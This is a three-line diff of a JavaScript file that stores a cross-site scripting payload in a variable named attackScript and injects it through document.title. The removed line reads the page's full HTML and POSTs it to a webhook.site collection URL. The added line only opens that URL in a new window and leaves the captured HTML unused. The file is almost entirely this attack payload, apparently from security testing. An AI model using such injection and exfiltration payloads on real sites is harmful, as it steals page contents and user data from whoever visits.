@@ -1,3 +1,3 @@
-var attackScript = "<script>var html = document.documentElement.outerHTML; var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeURIComponent(html));server.send();</script>"
+var attackScript = "<script>var html = document.documentElement.outerHTML; window.open('https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=');</script>"
 
 document.title = attackScript;
